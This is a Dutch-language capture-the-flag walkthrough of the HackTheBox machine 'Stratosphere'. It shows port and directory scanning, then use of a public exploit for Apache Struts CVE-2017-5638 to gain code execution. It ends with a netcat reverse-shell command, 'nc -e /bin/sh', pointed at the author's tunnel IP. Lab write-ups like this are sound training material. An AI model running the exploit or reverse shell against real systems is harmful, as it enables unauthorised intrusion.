# Stratosphere

## Low privilege

Eerst begin ik met een Nmap scan:

``` nmap -sV -p- -T5 -oN 10.10.10.64.nmap```

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/1.PNG" />

<ul>
	<li>sV: Probeer versie namen te vinden</li>
	<li>-p-: Scan alle TCP poorten </li>
	<li>-T5: Scan snel en aggresief</li>
	<li>-oN: Save output als Nmap formaat </li>
</ul>


Er is een webserver dus draai ik meteen een dirbsearch scan:

```python3 dirsearch.py -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -t 25 ```

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/2.PNG" />
Argumenten spreken voor zich neem ik aan.

Wanneer ik naar /Monitoring navigeer word ik omgeleid naar http://10.10.10.64/Monitoring/example/Welcome.action. Ik wist niet precies wat er bij .action bestanden hoorden dus had ik dat opgezocht op Google.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/3.PNG" />

Ik lees Struts, dus weet ik genoeg.

```searchsploit -x linux/webapps/41570.py ```

Dit is een Python script dat CVE-2017-5638 probeert te exploiteren.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/4.PNG" />

Hoppa, remote code execution! Het is nu de bedoeling dat ik een shell krijg, en dat is niet zo moeilijk. In plaats van ```echo "Gio" ``` als commando te gebruiken gebruik ik een commando waarmee ik dus een shell kan krijgen. De commando die ik meestal gebruik is: ```nc -e /bin/sh [Mijn tunnel ip] 1234 ```